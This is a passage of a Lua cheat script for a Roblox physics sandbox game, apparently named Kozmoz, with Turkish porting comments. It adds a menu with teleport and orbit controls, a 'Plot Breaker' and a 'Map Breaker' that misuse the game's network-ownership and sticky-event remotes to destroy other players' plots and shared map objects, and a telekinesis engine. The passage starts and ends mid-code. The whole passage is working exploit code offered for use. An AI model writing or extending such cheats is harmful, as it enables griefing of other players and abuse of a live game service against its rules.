        TPStuff.tpKeybind = string.gsub(tostring(TPStuff.tpKeybindCode), "Enum.KeyCode.", "")
        keybindLabel:SetText('<font color="rgb(255, 160, 0)">Keybind: ' .. TPStuff.tpKeybind .. '</font>')
        return
    end
    if _G.TPKeybindEnabled and input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == TPStuff.tpKeybindCode then
        TeleportToMouse()
    end
end)

OrbitActive = false
OrbitObject = nil
OrbitConnection = nil
OrbitRadius = 5
OrbitSpeed = 2
OrbitHeight = 2

local function GetLookedObject()
    myChar = Services.LocalPlayer.Character
    if not myChar then return nil end
    camera = workspace.CurrentCamera
    rayOrigin = camera.CFrame.Position
    rayDirection = camera.CFrame.LookVector * 1000
    params = RaycastParams.new()
    params.FilterDescendantsInstances = {myChar}
    params.FilterType = Enum.RaycastFilterType.Blacklist
    result = workspace:Raycast(rayOrigin, rayDirection, params)
    if result and result.Instance then
        hitPart = result.Instance
        rootPart = hitPart:FindFirstAncestorWhichIsA("BasePart") or hitPart
        return rootPart, hitPart.Parent
    end
    return nil, nil
end

local function GetObjectName(obj)
    if not obj then return "Unknown" end
    model = obj:FindFirstAncestorWhichIsA("Model")
    if model and model.Name then return model.Name
    elseif obj.Name then return obj.Name end
    return "Object"
end

local function BringObject(targetPart)
    if not targetPart or not targetPart:IsA("BasePart") then return end
    myChar = Services.LocalPlayer.Character
    myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
    if not myRoot then return end
    if OrbitActive then
        if OrbitConnection then OrbitConnection:Disconnect() end
        OrbitActive = false
        OrbitObject = nil
    end
    savedPos = myRoot.CFrame
    objectName = GetObjectName(targetPart)
    originalAnchored = targetPart.Anchored
    if originalAnchored then targetPart.Anchored = false end
    myRoot.CFrame = targetPart.CFrame * CFrame.new(0, 0, 2)
    myRoot.AssemblyLinearVelocity = Vector3.zero
    task.wait(0.1)
    for i = 1, 10 do
        pcall(function() Services.SetNetOwner:FireServer(targetPart, targetPart.CFrame) end)
        task.wait(0.02)
    end
    for i = 1, 5 do
        pcall(function() Services.DestroyLine:FireServer(targetPart) end)
        task.wait(0.01)
    end
    targetPart.CFrame = savedPos * CFrame.new(0, 0, -7)
    targetPart.AssemblyLinearVelocity = Vector3.zero
    targetPart.AssemblyAngularVelocity = Vector3.zero
    task.wait(0.1)
    myRoot.CFrame = savedPos
    myRoot.AssemblyLinearVelocity = Vector3.zero
end

local function StopOrbit()
    if OrbitConnection then
        OrbitConnection:Disconnect()
        OrbitConnection = nil
    end
    if OrbitObject and OrbitObject.Parent then
        pcall(function()
            OrbitObject.AssemblyLinearVelocity = Vector3.new(
                math.random(-30, 30),
                math.random(20, 40),
                math.random(-30, 30)
            )
        end)
    end
    OrbitActive = false
    OrbitObject = nil
end

local function StartOrbitFollow(targetPart)
    if not targetPart or not targetPart:IsA("BasePart") then return end
    isMapPart = false
    if targetPart.Locked then
        pcall(function()
            if targetPart:IsDescendantOf(workspace.Map) then
                isMapPart = true
            end
        end)
    end
    if isMapPart then
        return
    end
    myChar = Services.LocalPlayer.Character
    myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
    if not myRoot then return end
    if OrbitActive then StopOrbit() end
    objectName = GetObjectName(targetPart)
    savedPos = myRoot.CFrame
    myRoot.CFrame = targetPart.CFrame * CFrame.new(0, 0, 2)
    myRoot.AssemblyLinearVelocity = Vector3.zero
    task.wait(0.1)
    for i = 1, 15 do
        pcall(function() Services.SetNetOwner:FireServer(targetPart, targetPart.CFrame) end)
        task.wait(0.02)
    end
    wasAnchored = targetPart.Anchored
    if wasAnchored then targetPart.Anchored = false end
    targetPart.CanCollide = false
    bodyVel = Instance.new("BodyVelocity")
    bodyVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bodyVel.Velocity = Vector3.zero
    bodyVel.Parent = targetPart
    OrbitActive = true
    OrbitObject = targetPart
    angle = 0
    myRoot.CFrame = savedPos
    myRoot.AssemblyLinearVelocity = Vector3.zero
    OrbitConnection = Services.RunService.RenderStepped:Connect(function()
        if not OrbitActive or not OrbitObject or not OrbitObject.Parent or not myRoot or not myRoot.Parent then
            StopOrbit()
            if bodyVel then bodyVel:Destroy() end
            return
        end
        angle = angle + (OrbitSpeed * 0.05)
        if angle > 360 then angle = angle - 360 end
        rad = math.rad(angle)
        x = math.cos(rad) * OrbitRadius
        z = math.sin(rad) * OrbitRadius
        orbitPos = myRoot.Position + Vector3.new(x, OrbitHeight, z)
        OrbitObject.CFrame = CFrame.new(orbitPos, myRoot.Position)
        OrbitObject.AssemblyLinearVelocity = Vector3.zero
        OrbitObject.AssemblyAngularVelocity = Vector3.zero
        pcall(function() Services.SetNetOwner:FireServer(OrbitObject, OrbitObject.CFrame) end)
    end)
end

ObjectGroup = Tabs.KeybindsTab:AddRightGroupbox("Object Controls", "cog")

ObjectGroup:AddLabel("Orbit Lock", true, Color3.fromRGB(255, 100, 255))

OrbitKB = {
    Key = Enum.KeyCode.P,
    Waiting = false,
    Label = nil
}

orbitKeyName = string.gsub(tostring(OrbitKB.Key), "Enum.KeyCode.", "")
OrbitKB.Label = ObjectGroup:AddLabel('<font color="rgb(255,100,255)">Orbit Key: ' .. orbitKeyName .. '</font>')

ObjectGroup:AddButton({
    Text = "Change Orbit Keybind",
    Func = function()
        OrbitKB.Waiting = true
    end
})

ObjectGroup:AddDivider()

ObjectGroup:AddLabel("Orbit Settings", true, Color3.fromRGB(200, 200, 100))

ObjectGroup:AddSlider("OrbitRadius", {
    Text = "Radius",
    Default = 5,
    Min = 1,
    Max = 100,
    Decimals = 1,
    Callback = function(v) OrbitRadius = v end
})

ObjectGroup:AddSlider("OrbitSpeed", {
    Text = "Speed",
    Default = 2,
    Min = 0,
    Max = 10000,
    Decimals = 10,
    Callback = function(v) OrbitSpeed = v end
})

ObjectGroup:AddSlider("OrbitHeight", {
    Text = "Height",
    Default = 5,
    Min = 0,
    Max = 100,
    Decimals = 1,
    Callback = function(v) OrbitHeight = v end
})

ObjectGroup:AddDivider()

ObjectGroup:AddButton({
    Text = "Stop Orbit",
    Func = function()
        if OrbitActive then
            StopOrbit()
        else
        end
    end
})

ObjectGroup:AddLabel("", true)
ObjectGroup:AddLabel("P = Make object/player orbit around you", true)

Services.UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if OrbitKB.Waiting then
        OrbitKB.Key = input.KeyCode
        OrbitKB.Waiting = false
        newName = string.gsub(tostring(OrbitKB.Key), "Enum.KeyCode.", "")
        OrbitKB.Label:SetText('<font color="rgb(255,100,255)">Orbit Key: ' .. newName .. '</font>')
        return
    end
    if input.KeyCode == OrbitKB.Key then
        lookedObj = GetLookedObject()
        if lookedObj then
            if MultiOrbitEnabled then
                AddToMultiOrbit(lookedObj)
            else
                StartOrbitFollow(lookedObj)
            end
        else
        end
    end
end)

Services.UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
    if OrbitKB.Waiting then
        OrbitKB.Waiting = false
        OrbitKB.Key = input.KeyCode
        keyName = string.gsub(tostring(OrbitKB.Key), "Enum.KeyCode.", "")
        OrbitKB.Label:SetText('<font color="rgb(255,100,255)">Orbit Key: ' .. keyName .. '</font>')
        return
    end
    if input.KeyCode == OrbitKB.Key then
        if OrbitActive then
            StopOrbit()
        else
            camera = workspace.CurrentCamera
            params = RaycastParams.new()
            params.FilterDescendantsInstances = {Services.LocalPlayer.Character}
            params.FilterType = Enum.RaycastFilterType.Blacklist
            result = workspace:Raycast(camera.CFrame.Position, camera.CFrame.LookVector * 1000, params)
            if result and result.Instance and result.Instance:IsA("BasePart") then
                task.spawn(function() StartOrbitFollow(result.Instance) end)
            else
            end
        end
    end
end)

oldCleanup = getgenv().KozmozLoadingCleanup
getgenv().KozmozLoadingCleanup = function()
    if OrbitActive then StopOrbit() end
    if oldCleanup then oldCleanup() end
end

Players = game:GetService("Players")
LocalPlayer = Players.LocalPlayer
Workspace = game:GetService("Workspace")
RunService = game:GetService("RunService")

if not Tabs then
    warn("❌ Tabs is nil — script is running before UI library loads")
    return
end
if not Library then
    warn("❌ Library is nil — script is running before UI library loads")
    return
end

PlotBreakerGroup = Tabs.AurasTab:AddRightGroupbox("Plot Breaker", "bomb")

PlotOptions = {"Plot1 (Green)", "Plot2 (Pink)", "Plot3 (Purple)", "Plot4 (blue)", "Plot5 (Yellow)"}
SelectedPlot = "Plot1"

PlotBreakerGroup:AddDropdown("SelectPlot", {
    Text = "Select Plot",
    Values = PlotOptions,
    Default = "Plot1 (Green)",
    Callback = function(Value)
        SelectedPlot = Value:match("Plot(%d)")
    end
})

function getHRP_Plot()
    local character = plr.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        return character.HumanoidRootPart
    else
        character = plr.CharacterAdded:Wait()
        return character:WaitForChild("HumanoidRootPart")
    end
end

function getOrCreateShuriken()
    local playersInPlots = w:FindFirstChild("PlotItems") and w.PlotItems:FindFirstChild("PlayersInPlots")
    if playersInPlots and playersInPlots:FindFirstChild(plr.Name) then
        Library:Notify({Title = "Break Plot", Content = "You Are In safe zone!", Duration = 3})
        return nil
    end
    local inv = w:FindFirstChild(plr.Name.."SpawnedInToys")
    if not inv then return nil end
    local myHRP = getHRP_Plot()
    for _, obj in pairs(inv:GetChildren()) do
        if (obj.Name == "NinjaShuriken" or obj.Name == "Noclipped") and obj:FindFirstChild("StickyPart") and obj:FindFirstChild("SoundPart") then
            if myHRP and (obj.StickyPart.Position - myHRP.Position).Magnitude <= 12 then
                return obj
            end
        end
    end
    local currentHRP = getHRP_Plot()
    if not currentHRP then return nil end
    local toyAdded
    local shur = nil
    toyAdded = inv.ChildAdded:Connect(function(child)
        if child.Name == "NinjaShuriken" then
            shur = child
            toyAdded:Disconnect()
        end
    end)
    functions.SpawnToy:InvokeServer("NinjaShuriken", currentHRP.CFrame * CFrame.new(5, 8, 20), Vector3.new(0, 0, 0))
    local startTime = tick()
    repeat
        if shur and shur:FindFirstChild("StickyPart") and shur:FindFirstChild("SoundPart") then
            return shur
        end
        task.wait(0.01)
    until tick() - startTime > 0.1
    return inv:FindFirstChild("NinjaShuriken")
end

PlotBreakerGroup:AddButton({
    Text = "Break Plot [Shuriken]",
    Func = function()
        local shur = getOrCreateShuriken()
        if not shur then return end
        local soundPart = shur:FindFirstChild("SoundPart")
        local stickyPart = shur:FindFirstChild("StickyPart")
        if not stickyPart then return end
        if soundPart then
            for i = 1, 20 do
                functions.SetNetOwner:FireServer(soundPart, soundPart.CFrame)
                if soundPart:FindFirstChild("PartOwner") and soundPart.PartOwner.Value == plr.Name then break end
            end
        end
        for _, obj in pairs(shur:GetChildren()) do
            if obj:IsA("BasePart") then
                obj.CanTouch = false; obj.CanCollide = false; obj.CanQuery = false
                if obj.Transparency == 0 then obj.Transparency = 1 end
            end
        end
        shur.Name = "Noclipped"
        local plot = w.Plots:FindFirstChild("Plot"..SelectedPlot)
        if not plot then return end
        local plotArea = plot:FindFirstChild("PlotArea")
        if not plotArea then return end
        functions.StickyEvent:FireServer(stickyPart, plotArea, CFrame.new(1099511627776, 1099511627776, 1099511627776, 1, 0, 0, 0, 1, 0, 0, 0, 1))
    end
})


-- =====================================================================
-- [KOZMOZ PORT] Map Breaker kutusu (musa: Map Breaker)
-- musa(4) kaynagindan tasiindi; Obsidian elemanlarina uyarlandi ve
-- musa'daki davranisin tamami (durum + yardimci fonksiyonlar) korundu.
-- =====================================================================
MapBreakerGroup = Tabs.AurasTab:AddLeftGroupbox("Map Breaker", "bomb")
do
    local function getCurrentToyFolder2()
        local inPlot = KozPLR:FindFirstChild("InPlot")
        if inPlot and inPlot.Value then
            local plots = KozWS:FindFirstChild("Plots")
            if plots then
                for i = 1, 5 do
                    local p = plots:FindFirstChild("Plot" .. i)
                    if p and p:FindFirstChild("PlotSign") then
                        local sign = p.PlotSign
                        for _, name in ipairs({"ThisPlotsOwners", "ThisPlotsOwner", "ThisPlotOwners"}) do
                            local c = sign:FindFirstChild(name)
                            if c then
                                local owner = c:IsA("StringValue") and c or c:FindFirstChildOfClass("StringValue")
                                if owner and owner.Value == KozPLR.Name then
                                    return KozWS.PlotItems:FindFirstChild("Plot" .. i)
                                end
                            end
                        end
                    end
                end
            end
        end
        return KozWS:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
    end
    local function GetFolder()
        return getCurrentToyFolder2()
    end
    local function HideShuriken(shuriken)
        pcall(function()
            for _, v in ipairs(shuriken:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.CanTouch = false
                    v.CanCollide = false
                    v.CanQuery = false
                    v.Transparency = 1
                end
            end
        end)
    end
    local function SpawnBreakShuriken()
        local hrp = KozPLR.Character and KozPLR.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return nil end
        local folder = GetFolder()
        if not folder then return nil end
        local shuriken = nil
        local conn = folder.ChildAdded:Connect(function(child)
            if child.Name == "NinjaShuriken" and not shuriken then
                shuriken = child
            end
        end)
        task.spawn(function()
            pcall(function()
                KozDisp:Invoke(KozRemote.SpawnToyRemoteFunction, "NinjaShuriken", CFrame.new(hrp.Position) + Vector3.new(5, 0, 20), Vector3.zero)
            end)
        end)
        local start = tick()
        repeat task.wait() until shuriken or tick() - start > 1
        conn:Disconnect()
        if not shuriken then shuriken = folder:FindFirstChild("NinjaShuriken") end
        return shuriken
    end
    local currentGrabbedHighlight = nil
    local function GetGrabbedPart()
        local g = KozWS:FindFirstChild("GrabParts")
        if not g then return nil end
        local gp = g:FindFirstChild("GrabPart")
        if not gp then return nil end
        local weld = gp:FindFirstChild("WeldConstraint") or gp:FindFirstChild("Weld")
        if not weld then return nil end
        return weld.Part1 or nil
    end
    local function BreakPart(part)
        if not part or not part:IsA("BasePart") then return end
        local shuriken = SpawnBreakShuriken()
        local stickyPart = shuriken and shuriken:WaitForChild("StickyPart", 0.5)
        if not stickyPart then
            if shuriken then pcall(function() KozDisp:Fire(KozRemote.DestroyToy, shuriken) end) end
            return
        end
        pcall(function() KozDisp:Fire(KozRemote.SetNetworkOwner, stickyPart, stickyPart.CFrame) end)
        local start = tick()
        repeat task.wait() until (stickyPart:FindFirstChild("PartOwner") and stickyPart.PartOwner.Value == KozPLR.Name) or tick() - start > 0.5
        if tick() - start > 0.5 then
            pcall(function() KozDisp:Fire(KozRemote.DestroyToy, shuriken) end)
            return
        end
        pcall(function() KozDisp:Fire(functions.StickyEvent, stickyPart, part, CFrame.new(1e15, 1e15, 1e15)) end)
        HideShuriken(shuriken)
    end
    local function StickToGrabbedPartOnce()
        local grabbed = GetGrabbedPart()
        if not grabbed then
            local cam = KozWS.CurrentCamera
            if cam then
                local camCF = cam.CFrame
                local rayParams = RaycastParams.new()
                rayParams.FilterType = Enum.RaycastFilterType.Exclude
                local char = KozPLR.Character
                rayParams.FilterDescendantsInstances = char and {char} or {}
                local result = KozWS:Raycast(camCF.Position, camCF.LookVector * 50000, rayParams)
                if result and result.Instance then
                    grabbed = result.Instance
                end
            end
            if not grabbed then return end
        end
        if currentGrabbedHighlight then
            pcall(function() currentGrabbedHighlight:Destroy() end)
            currentGrabbedHighlight = nil
        end
        local highlight = Instance.new("SelectionBox")
        highlight.Adornee = grabbed
        highlight.Color3 = Color3.fromRGB(0, 250, 0)
        highlight.LineThickness = 0.03
        highlight.SurfaceTransparency = 0.8
        highlight.SurfaceColor3 = Color3.fromRGB(0, 250, 0)
        highlight.Parent = grabbed
        currentGrabbedHighlight = highlight
        BreakPart(grabbed)
        task.delay(3, function()
            if currentGrabbedHighlight and currentGrabbedHighlight == highlight then
                pcall(function() highlight:Destroy() end)
                currentGrabbedHighlight = nil
            end
        end)
    end
    MapBreakerGroup:AddButton({
        Text = "Stick To Grabbed Part",
        Func = function()
            task.spawn(StickToGrabbedPartOnce)
        end
    })
    local function FindBreakTarget(model, kind)
        local Object = model:FindFirstChild("Object")
        if not Object then return nil end
        local ObjectModel = Object:FindFirstChild("ObjectModel", true)
        if not ObjectModel then return nil end
        local target = ObjectModel:FindFirstChild("Body", true)
        if not target then
            local kids = ObjectModel:GetChildren()
            if kind == "OuterUFO" then
                target = ObjectModel:FindFirstChild("CylinderOctagon")
            elseif kind == "InnerUFO" then
                target = kids[16]
            elseif kind == "CaveCart" then
                target = kids[8]
            elseif kind == "Train" then
                target = kids[29]
            end
            if not target then
                target = ObjectModel:FindFirstChildWhichIsA("BasePart")
            end
        end
        return target
    end
    local function BreakWithShurikens(model, target, notifyText)
        local hrp = KozPLR.Character and KozPLR.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local BackPack = KozWS:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
        if not BackPack then return end
        for _, child in ipairs(BackPack:GetChildren()) do
            local sp = child:FindFirstChild("StickyPart")
            if sp and not sp:FindFirstChild("StickyWeld") and (child.Name == "NinjaShuriken" or tonumber(child.Name)) then
                pcall(function() KozDisp:Fire(KozRemote.DestroyToy, child) end)
            end
        end
        task.wait(0.2)
        local canSpawn = KozPLR:WaitForChild("CanSpawnToy", 5)
        local stuckCount = 0
        for i = 1, 10 do
            if not hrp or not hrp.Parent then break end
            local attached = false
            for attempt = 1, 3 do
                if attached then break end
                if not hrp or not hrp.Parent then break end
                if canSpawn then
                    local deadline = tick() + 5
                    while not canSpawn.Value and tick() < deadline and hrp and hrp.Parent do
                        task.wait()
                    end
                end
                local shur = nil
                local conn = BackPack.ChildAdded:Connect(function(child)
                    if child.Name == "NinjaShuriken" and not shur then
                        shur = child
                    end
                end)
                task.spawn(function()
                    pcall(function()
                        KozDisp:Invoke(KozRemote.SpawnToyRemoteFunction, "NinjaShuriken", hrp.CFrame * CFrame.new(0, -1, 15), Vector3.zero)
                    end)
                end)
                local startTime = tick()
                while not shur and tick() - startTime < 1 and hrp and hrp.Parent do
                    task.wait()
                end
                if conn then conn:Disconnect() end
                if not hrp or not hrp.Parent then break end
                if not shur then
                    shur = BackPack:FindFirstChild("NinjaShuriken")
                end
                if shur then
                    local detectTime = tick()
                    shur.Name = tostring(i)
                    local stickyPart = shur:FindFirstChild("StickyPart")
                    local spStart = tick()
                    while not stickyPart and tick() - spStart < 1 and hrp and hrp.Parent do
                        stickyPart = shur:FindFirstChild("StickyPart")
                        task.wait()
                    end
                    if stickyPart then
                        local soundPart = shur:FindFirstChild("SoundPart") or stickyPart
                        pcall(function() KozDisp:Fire(KozRemote.SetNetworkOwner, soundPart, soundPart.CFrame) end)
                        pcall(function()
                            KozDisp:Fire(functions.StickyEvent, stickyPart, target, CFrame.Angles(0, 0, 0))
                        end)
                    end
                    local waitUntil = detectTime + 0.5
                    while tick() < waitUntil and hrp and hrp.Parent do task.wait() end
                    if stickyPart then
                        local shurPos = stickyPart.Position
                        local tPos = target.Position
                        if (shurPos - tPos).Magnitude <= 20 then
                            attached = true
                            stuckCount = stuckCount + 1
                        else
                            pcall(function() KozDisp:Fire(KozRemote.DestroyToy, shur) end)
                        end
                    else
                        pcall(function() KozDisp:Fire(KozRemote.DestroyToy, shur) end)
                    end
                end
                task.wait(0.1)
            end
        end
        local attach = target:FindFirstChild("ObjectModelAttachment")
        if attach then
            attach:Destroy()
        end
        local followPart = model:FindFirstChild("FollowThisPart", true)
        if followPart then
            local alignPos = followPart:FindFirstChild("AlignPosition")
            local alignRot = followPart:FindFirstChild("AlignOrientation")
            if alignPos then alignPos.Attachment0 = nil end
            if alignRot then alignRot.Attachment0 = nil end
        end
        if stuckCount >= 10 then
            Library:Notify({ Title = "LOLL", Description = notifyText, Duration = 3 })
        end
    end
    MapBreakerGroup:AddButton({
        Text = "Break Outer UFO",
        Func = function()
            pcall(function()
                    local w = KozWS
                    local ufoModel = w:FindFirstChild("Map")
                    if ufoModel then
                        ufoModel = ufoModel:FindFirstChild("AlwaysHereTweenedObjects")
                        if ufoModel then
                            ufoModel = ufoModel:FindFirstChild("OuterUFO")
                        end
                    end
                    if not ufoModel then
                        Library:Notify({ Title = "LOLL", Description = "Outer UFO not found!", Duration = 3 })
                        return
                    end
                    local body = FindBreakTarget(ufoModel, "OuterUFO")
                    if not body then
                        Library:Notify({ Title = "LOLL", Description = "UFO Body not found!", Duration = 3 })
                        return
                    end
                    BreakWithShurikens(ufoModel, body, "Outer UFO Broken!")
                end)
        end
    })
    MapBreakerGroup:AddButton({
        Text = "Break Inner UFO",
        Func = function()
            pcall(function()
                    local w = KozWS
                    local ufoModel = w:FindFirstChild("Map")
                    if ufoModel then
                        ufoModel = ufoModel:FindFirstChild("AlwaysHereTweenedObjects")
                        if ufoModel then
                            ufoModel = ufoModel:FindFirstChild("InnerUFO")
                        end
                    end
                    if not ufoModel then
                        Library:Notify({ Title = "LOLL", Description = "Inner UFO not found!", Duration = 3 })
                        return
                    end
                    local body = FindBreakTarget(ufoModel, "InnerUFO")
                    if not body then
                        Library:Notify({ Title = "LOLL", Description = "UFO Body not found!", Duration = 3 })
                        return
                    end
                    BreakWithShurikens(ufoModel, body, "Inner UFO Broken!")
                end)
        end
    })
    MapBreakerGroup:AddButton({
        Text = "Break CaveCart",
        Func = function()
            pcall(function()
                    local w = KozWS
                    local cartModel = w:FindFirstChild("Map")
                    if cartModel then
                        cartModel = cartModel:FindFirstChild("AlwaysHereTweenedObjects")
                        if cartModel then
                            cartModel = cartModel:FindFirstChild("CaveCart")
                        end
                    end
                    if not cartModel then
                        Library:Notify({ Title = "LOLL", Description = "CaveCart not found!", Duration = 3 })
                        return
                    end
                    local target = FindBreakTarget(cartModel, "CaveCart")
                    if not target then
                        Library:Notify({ Title = "LOLL", Description = "CaveCart Target not found!", Duration = 3 })
                        return
                    end
                    BreakWithShurikens(cartModel, target, "CaveCart Broken!")
                end)
        end
    })
    MapBreakerGroup:AddButton({
        Text = "Break Train",
        Func = function()
            pcall(function()
                    local w = KozWS
                    local trainModel = w:FindFirstChild("Map")
                    if trainModel then
                        trainModel = trainModel:FindFirstChild("AlwaysHereTweenedObjects")
                        if trainModel then
                            trainModel = trainModel:FindFirstChild("Train")
                        end
                    end
                    if not trainModel then
                        Library:Notify({ Title = "LOLL", Description = "Train not found!", Duration = 3 })
                        return
                    end
                    local target = FindBreakTarget(trainModel, "Train")
                    if not target then
                        Library:Notify({ Title = "LOLL", Description = "Train Target not found!", Duration = 3 })
                        return
                    end
                    BreakWithShurikens(trainModel, target, "Train Broken!")
                end)
        end
    })
end

-- =====================================================================
-- [KOZMOZ PORT] Other kutusu: Bring Train / Traktor / ESP / Gamepass
-- musa(4) kaynagindan tasiindi; Obsidian elemanlarina uyarlandi ve
-- musa'daki davranisin tamami (durum + yardimci fonksiyonlar) korundu.
-- =====================================================================
TrainMiscGroup = Tabs.AurasTab:AddRightGroupbox("Other", "rocket")
-- [KOZMOZ PORT] Telekinesis motoru + Arac Listesi (musa(4) 24577-25231 / 24295-24522)
-- PNG3'teki 'Grabbed Pallet Explore' ve PNG4'teki 'Spisok' bu motorlara bagli;
-- motorlar tasindigi icin artik kaynaklardaki gibi calisiyorlar.
do
    -- Settings.Telekinesis varsayilanlari (kaynaktaki Settings tablosundan)
    KozFlags.tk_Enabled = false
    KozFlags.tk_Style = "Circle"
    KozFlags.tk_Radius = 15
    KozFlags.tk_Height = 5
    KozFlags.tk_Speed = 10
    KozFlags.tk_TargetSpawned = false
    KozFlags.tk_Toy = "PalletLightBrown"
    KozFlags.tk_CustomMainPart = nil
    KozFlags.tk_grabToysFly = false
    KozFlags.tk_RotX = 0
    KozFlags.tk_RotY = 0
    KozFlags.tk_RotZ = 0
    KozFlags.tk_lookAtMe = false
    KozFlags.tk_autoRecover = false
    KozFlags.tk_TreeHeight = 20
    KozFlags.tk_palletExplore = false
    KozFlags.tk_freezeHighlight = false
    KozFlags.tk_freezeAutoRecover = false
    KozFlags.tk_freezeLookAtMain = true
    KozFlags.tk_crazyRadius = false
    -- ---- TelekinesisFeature ----
        local TelekinesisFeature = {}
        TelekinesisFeature.activeItems = {}
        TelekinesisFeature.spawnConn = nil
        TelekinesisFeature.auraConn = nil
            local GE = KozRS:WaitForChild("GrabEvents")
            local SetNetworkOwner = GE:WaitForChild("SetNetworkOwner")
            local CreateGrabLine = Services.CreateLine
            local DestroyGrabLine = Services.DestroyLine
            local SpawnToyRF = Services.SpawnToy
        function TelekinesisFeature.getDrivePart(model)
            local main = model:FindFirstChild("Main")
            if main then return main end
            local sp = model:FindFirstChild("SoundPart")
            if sp then return sp end
            return model:FindFirstChildWhichIsA("BasePart")
        end
        function TelekinesisFeature.preparePart(model)
            local drivePart = TelekinesisFeature.getDrivePart(model)
            if not drivePart then return false end
            local myChar = KozPLR.Character
            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if not myRoot then return false end
            local savedCFrame = myRoot.CFrame
            myRoot.CFrame = drivePart.CFrame * CFrame.new(0, 3, 0)
            task.wait(0.15)
            for _, part in ipairs(model:GetDescendants()) do
                if part:IsA("BasePart") and part.Parent then
                    KozDisp:Fire(SetNetworkOwner, part, Vector3.zero)
                end
            end
            task.wait(0.2)
            myRoot.CFrame = savedCFrame
            return true
        end
        function TelekinesisFeature.getNearbyGrabPart(model)
            local dp = TelekinesisFeature.getDrivePart(model)
            if not dp or not dp.Parent then return nil, nil end
            local halfSize = dp.Size / 2
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= KozPLR then
                    local plrFolder = Workspace:FindFirstChild(plr.Name)
                    if plrFolder then
                        local gpFolder = plrFolder:FindFirstChild("GrabParts")
                        if gpFolder then
                            for _, gp in ipairs(gpFolder:GetChildren()) do
                                if gp:IsA("BasePart") and gp.Name == "GrabPart" and gp.Parent then
                                    local rel = dp.CFrame:PointToObjectSpace(gp.Position)
                                    if math.abs(rel.X) <= halfSize.X + 1
                                        and math.abs(rel.Y) <= halfSize.Y + 1
                                        and math.abs(rel.Z) <= halfSize.Z + 1 then
                                        return gp, plr
                                    end
                                end
                            end
                        end
                    end
                end
            end
            return nil, nil
        end
        function TelekinesisFeature.startOrbit(model, skipPrepare)
            if TelekinesisFeature.activeItems[model] then return end
            local grabPart = TelekinesisFeature.getNearbyGrabPart(model)
            if grabPart then return end
            if not skipPrepare then
                local ok = TelekinesisFeature.preparePart(model)
                if not ok then return end
            end
            local drivePart = TelekinesisFeature.getDrivePart(model)
            if drivePart then
                if drivePart.Anchored then
                    drivePart.Anchored = false
                end
                local bp = drivePart:FindFirstChildOfClass("BodyPosition")
                if not bp then
                    bp = Instance.new("BodyPosition")
                    bp.MaxForce = Vector3.new(5e18, 5e18, 5e18)
                    bp.D = 1000
                    bp.P = 50000
                    bp.Parent = drivePart
                end
                local bg = drivePart:FindFirstChildOfClass("BodyGyro")
                if not bg then
                    bg = Instance.new("BodyGyro")
                    bg.MaxTorque = Vector3.new(5e18, 5e18, 5e18)
                    bg.D = 1000
                    bg.P = 50000
                    bg.Parent = drivePart
                end
                TelekinesisFeature.activeItems[model] = {
                    drivePart = drivePart,
                    bp = bp,
                    bg = bg,
                }
            else
                TelekinesisFeature.activeItems[model] = {drivePart = nil, bp = nil, bg = nil}
            end
        end
        function TelekinesisFeature.stopOrbit(model)
            local data = TelekinesisFeature.activeItems[model]
            TelekinesisFeature.activeItems[model] = nil
            for _, part in ipairs(model:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = true
                end
            end
            local dp = data and data.drivePart
            if dp and dp.Parent then
                pcall(function()
                    dp.Anchored = false
                    dp.AssemblyLinearVelocity = Vector3.zero
                    dp.AssemblyAngularVelocity = Vector3.zero
                end)
            end
            if data and data.bg then pcall(function() data.bg:Destroy() end) end
        end
        function TelekinesisFeature.stopAll()
            for model, data in pairs(TelekinesisFeature.activeItems) do
                if model and model.Parent then
                    for _, part in ipairs(model:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = true
                        end
                    end
                    local dp = data and data.drivePart
                    if dp and dp.Parent then
                        pcall(function()
                            dp.Anchored = false
                            dp.AssemblyLinearVelocity = Vector3.zero
                            dp.AssemblyAngularVelocity = Vector3.zero
                        end)
                    end
                    if data.bp then pcall(function() data.bp:Destroy() end) end
                    if data.bg then pcall(function() data.bg:Destroy() end) end
                end
            end
            TelekinesisFeature.activeItems = {}
            if TelekinesisFeature.spawnConn then TelekinesisFeature.spawnConn:Disconnect() TelekinesisFeature.spawnConn = nil end
            if TelekinesisFeature.auraConn then task.cancel(TelekinesisFeature.auraConn) TelekinesisFeature.auraConn = nil end
        end
        function TelekinesisFeature.spawnToy(toyName)
            local myChar = KozPLR.Character
            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if not myRoot then return end
            local SpawnedInToys = Workspace:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
            if not SpawnedInToys then return end
            local connection
            connection = SpawnedInToys.ChildAdded:Connect(function(child)
                if child.Name == toyName then
                    connection:Disconnect()
                    task.wait(0.3)
                    TelekinesisFeature.startOrbit(child)
                end
            end)
            local spawnCFrame = myRoot.CFrame * CFrame.new(0, 0, -5)
            pcall(function() KozDisp:Invoke(SpawnToyRF, toyName, spawnCFrame, Vector3.new(0, 0, 0)) end)
            task.delay(5, function() pcall(function() connection:Disconnect() end) end)
        end
        function TelekinesisFeature.runAura()
            if TelekinesisFeature.auraConn then return end
            TelekinesisFeature.auraConn = task.spawn(function()
                local angle = 0
                local lastTime = tick()
                local scanTick = 0
                local savedCF = nil
                while KozFlags.tk_Enabled do
                    task.wait(1e-10)
                    local now = tick()
                    local dt = math.max(now - lastTime, 0.001)
                    lastTime = now
                    if now - scanTick > 0.1 then
                        scanTick = now
                    end
                    local myChar = KozPLR.Character
                    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                    if not myRoot then continue end
                    local centerPart = KozFlags.tk_CustomMainPart
